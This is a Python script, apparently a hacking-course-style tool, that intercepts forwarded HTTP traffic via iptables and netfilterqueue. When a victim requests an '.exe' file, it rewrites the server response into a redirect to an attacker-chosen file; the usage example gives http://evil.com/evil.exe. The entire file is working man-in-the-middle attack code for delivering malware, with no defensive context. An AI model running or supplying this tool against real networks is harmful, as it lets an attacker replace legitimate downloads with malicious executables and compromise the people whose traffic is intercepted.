#!/usr/bin/python
from scapy.all import *
import netfilterqueue, os, sys

if len(sys.argv) !=2:
    print('Usage: sudo python %s <file to download instead>' %sys.argv[0])
    print('Example: sudo python %s http://evil.com/evil.exe' %sys.argv[0])
    sys.exit(0)
ack_list = []

def pre():
    os.system('iptables --flush')
    os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
    # os.system(' iptables --flush')
    # os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
    # os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')

def redirect(packet, load):
    packet[Raw].load = load
    ack_list.remove(packet[TCP].seq)
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet

def spoof(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        if scapy_packet[TCP].dport == 80:
            if '.exe' in scapy_packet[Raw].load:
                ack_list.append(scapy_packet[TCP].ack)
        elif scapy_packet[TCP].sport == 80:
            if scapy_packet[TCP].seq in ack_list:
                spoofed_packet = redirect(scapy_packet, 'HTTP/1.1 301 Moved Permanently\nLocation: ' + sys.argv[1] + '\n\n')
                packet.set_payload(str(spoofed_packet))
            
    packet.accept()

pre()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, spoof)
try:
    print('[+] File Intercepting Started...')
    queue.run()
except KeyboardInterrupt:
    os.system('iptables --flush')
